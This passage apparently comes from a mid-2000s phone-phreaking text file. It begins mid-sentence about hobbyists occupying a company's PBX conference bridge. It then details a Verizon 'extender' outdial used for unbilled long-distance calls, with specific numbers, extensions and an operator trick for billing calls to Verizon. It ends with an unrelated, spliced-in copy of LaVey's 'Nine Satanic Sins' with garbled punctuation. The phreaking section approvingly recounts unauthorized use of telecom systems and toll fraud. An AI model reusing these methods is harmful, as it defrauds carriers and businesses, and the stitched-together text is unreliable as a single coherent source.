a conference extension, just dedicated conferencing. Like, you call up the
number, hit the extension, which was "260", and you're dropped into a conf-
erence. The company, though, used this conference during the day. Which of
course presented a few problems. The conferences, though, could go on anyw-
ays. What ended up happening was that people would call in, starting around
6:00. The business was in Eastern time, and besides, it wasn't a good idea
to start right immediately after business hours, anyways. Conferences would
go most nights until 4:00 or 5:00 in the morning, on any given morning.
Eventually more hackers and phone phreaks started hitting up the conference,
and within a month or so it was ballooning to probably around 10 people at
any given time of day. 

Of course, no one was satisfied with just having the conference for 16 hours
of the day. So, eventually, people started filtering over into the daytime
conference. It was iffy, because whenever someone new joined, you'd have to 
be quiet. If it was a company employee, there'd be a flurry of parting (bee-
DOOP sounds), and all the kiddies would clear out of the conference. And also,
if you were joining in the daytime, you'd have to be quiet as well, because
there was a chance that the employees would be in the middle of a conference. 

Anyways, as you can probably guess, too many people started jumping on during
the day. Employees were like, "Oh, some kids got into our PBX." They locked
it down, and that was that. Ended somewhere around December 2005.


***The 718 Extender***

Well, I don't know how many of you folks ever checked out the 718 extender.

I-Ball originally found and posted this number on a certain forum, forever
ago. He said, "you press 9 for a dialtone." And you do, but there's a lot
more to it than that. Props to him, though, he found it.

Me and phone phreak Andrew, a fellow telephone-explorer from Newfoundland,
have played around with the system quite a bit. It's a god-send to people in
Canada, for making short calls to the States. It doesn't supervise. So, I get
a good three to four minutes per call going through it, y'know, since it
doesn't supervise. Telus, my local carrier, has its switches set up to time
out after a while. It's ually about four minutes. Of course, it's different
in other areas. Down in Cincinnatti, it's about 2 minutes 10 seconds, and of
course, it's different all over. Andrew used Aliant, on the east coast, and
they have messed up timeouts. Sometimes it's as high as 30 minutes, or unl-
imited. Anyways. The lack of supervision made some troubles for phone phreaks
calling it, because not all carriers pass audio before supervision. AT&T,
Telus, Bell Canada and a few others do, but a lot of people were just outta
luck. You could also set up your Asterisk system to call the number, and
assuming your VoIP carrier passed audio before supervision, you could talk
on that thing forever, 'cause you can set your Asterisk system to have unl-
imited timeouts on a call.

The extender is in Verizon territory, 718.397.9999. When you call an ANAC,
though, it reads the number back as 718.997.2341 (and the Caller ID Name
is "VERIZON NEW YORK"). I-Ball also mentioned that the 997 and 397 exchanges
in New York are both in Queens, and are physically seperated by about 3
miles. The 997.2341 exhcnage, that's a Verizon voicemail system. It wasn't
always a Verizon voicemail system. I've been playing around with this sys-
tem for quite a few months, and I figure someone else might find my rambl-
ings about it interesting. Okay, so I'm a curious guy. I wanted to see
what 718.997.2341 is. I called it, it's a Verizon voice messaging system.
Alright. What does Google have to say about it? Not much. Okay. Oh, and yeah.
For the outdial, it only calls numbers in the continental USA. You can call
the NYC 958 ANAC, though. But no Alaska, no Canada, at least, not directly.

There were still solutions for making long-distance calls to Canada and el-
sewhere, though. For a long time, you could just dial "0", and get the Ver-
izon automated operator. You could then select a new carrier, and ask for
dialing assistance. It even worked from some payphones, since it didn't
supervise. You could plug in your $2.50 in quarters, make the call, and get
your quarters back after the call, assuming your carrier passed audio before
supervision. Telus did, still does, on some of the older Centurion phones,
but the new Millenium COCOTs don't. So it was nice for quick calls while on
the run, assuming you had some coins.

Eventually, Verizon fixed that, and carriers wouldn't bill to the 997.2341
number anymore, so you couldn't loop through "0" and select a carrier with
dialing help to place a call. They fixed it about four months after they
got rid of the old James Earl Jones recordings, and put in that new lady.
That was quite a disappointment, calling that number up one day, and hear-
ing a new lady telling me, "Welcome to Verizon. Your broadband company."
I wasn't looking for a broadband company, I was looking for a telephone
company, a telephone company featuring James Earl Jones. Oh well, times
change. At least you can still listen to the old Verizon error messages
through the extender.

The system did a lot more than just be an outdial, though. You didn't
*have* to press 9 and call out the outdial, though. It's like a PBX, so
there were other options. One of the most slap-in-the-face things I fo-
und was that there are extensions that point to things like the old
Queens DMS SCC number, 718.997.2525. Because remember, even though you-
're dialing into the system via 397, your ANI is showing up as 997. So
you if you dial "2525" instead of "9", you get forwarded to what used to
be the Queens switch. Now, it's a voicemail box. Also, you can do the
same thing with pretty much any 2XXX number. But most of them just rin-
gout. "2500" , though, will go to fast busy. I checked out a bunch of old
numbers for CBCs and switches and such, from old files. Stuff that started
with 907.997.2XXX that might be telco related. Also, another weird one is
"2222." Instead of ringing out or going to an error message, it says, "The
number you have called, 1.718.997.2222 is not in service." 2222 used to
also forward to a voicemail system. Also, not suprisingly, if you hit
"2341" off the main menu, you'll be connected to the same 718.997.2341
number that the ANI reads back. I don't know what 718.997.2341 used to
point to, but my guess is it's some telco thing, because everything else
used to point to some telco thing.

Also, another weird extension is the "82XX" extension. "Verizon Island
Metro Wholesale VRC." You can dial 82, then any 2-digit combo, and you'll
get forwarded to the "Verizon Island Metro Wholesale VRC." There's nothing
there. Once you hear the original prompts, you are dropped nicely into a
big black hole. I don't know what the significance of the "XX" part is.
Maybe there used to be more than one line in there. If you call the system,
then like, 8253, then hangup real fast, then call back and hit 8234, you'll
get a busy, like the line is in use. Which it probably is. There's probably
only one line in there.

And that's another thing. There is only one line into the 718 extender, so
when you call it, and someone else is on it, you're outta luck. I mean, you
american blokes probably won't be using the extender part much, since you
have greatcalling and such, but still. It's cool. Like, maybe the whole
system was used for administration, or so that technicians could make test
calls and stuff, and call home, on a non-supervising line. That way whoev-
er's premises they were at wouldn't have to foot the bill. Just an idea.
Anyways, if anyone else has any more information on this system, I'd be
stoked to know it.

This system can no longer access the old features. As of Febuary, 2006,
Verizon finially got rid of the old system, and replaced it with a "n-
ormal" diverter. So, now, you just dial it up, get a dialtone, and enter
your code, and dial out, and that's it. No special features, no hand in
the pocket of history. Oh well. Times change.

That's it! Not a whole lot to talk about here. That's it. Keep it real in
the telephonic real, kids.

			  The Nine Satanic Sins

                       by Anton Szandor LaVey, 1987

1. Stupidity . The top of the list for Satanic Sins. The Cardinal Sin of
   Satanism. It's too bad that stupidity isn't painful. Ignorance is one
   thing, but our society thrives increasingly on stupidity. It depends on
   people going along with whatever they are told. The media promotes a
   cultivated stupidity as a posture that is not only acceptable but laudable.
   Satanists must learn to see through the tricks and cannot afford to be
   stupid. 

2. Pretentiousness . Empty posturing can be most irritating and isn.t applying
   the cardinal rules of Lesser Magic. On equal footing with stupidity for
   what keeps the money in circulation these days. Everyone.s made to feel
   like a big shot, whether they can come up with the goods or not. 

3. Solipsism . Can be very dangerous for Satanists. Projecting your reactions,
   responses and sensibilities onto someone who is probably far less attuned
   than you are. It is the mistake of expecting people to give you the same
   consideration, courtesy and respect that you naturally give them. They
   won.t. Instead, Satanists must strive to apply the dictum of "Do unto
   others as they do unto you." It.s work for most of us and requires constant
   vigilance lest you slip into a comfortable illusion of everyone being like
   you. As has been said, certain utopias would be ideal in a nation of
   philosophers, but unfortunately (or perhaps fortunately, from a
   Machiavellian standpoint) we are far from that point. 

4. Self-deceit . It.s in the .Nine Satanic Statements. but deserves to be
   repeated here. Another cardinal sin. We must not pay homage to any of the
   sacred cows presented to us, including the roles we are expected to play
   ourselves. The only time self-deceit should be entered into is when it.s
   fun, and with awareness. But then, it.s not self-deceit! 

5. Herd Conformity . That.s obvious from a Satanic stance. It.s all right to
   conform to a person.s wishes, if it ultimately benefits you. But only fools
   follow along with the herd, letting an impersonal entity dictate to you. The
   key is to choose a master wisely instead of being enslaved by the whims of
   the many. 

6. Lack of Perspective . Again, this one can lead to a lot of pain for a
   Satanist. You must never lose sight of who and what you are, and what a
   threat you can be, by your very existence. We are making history right now,
   every day. Always keep the wider historical and social picture in mind. That
   is an important key to both Lesser and Greater Magic. See the patterns and
   fit things together as you want the pieces to fall into place. Do not be
   swayed by herd constraints.know that you are working on another level
   entirely from the rest of the world. 

7. Forgetfulness of Past Orthodoxies . Be aware that this is one of the keys
   to brainwashing people into accepting something new and different, when in
   reality it.s something that was once widely accepted but is now presented
   in a new package. We are expected to rave about the genius of the creator
   and forget the original. This makes for a disposable society. 

8. Counterproductive Pride . That first word is important. Pride is great up
   to the point you begin to throw out the baby with the bathwater. The rule
   of Satanism is: if it works for you, great. When it stops working for you,
   when you.ve painted yourself into a corner and the only way out is to say,
   I.m sorry, I made a mistake, I wish we could compromise somehow, then do it. 

9. Lack of Aesthetics.This is the physical application of the Balance Factor.
   Aesthetics is important in Lesser Magic and should be cultivated. It is
   obvious that no one can collect any money off classical standards of beauty
   and form most of the time so they are discouraged in a consumer society,
   but an eye for beauty, for balance, is an essential Satanic tool and must
   be applied for greatest magical effectiveness. It.s not what.s supposed to
   be pleasing.it.s what is. Aesthetics is a personal thing, reflective of
   one.s own nature, but there are universally pleasing and harmonious
   configurations that should not be denied.
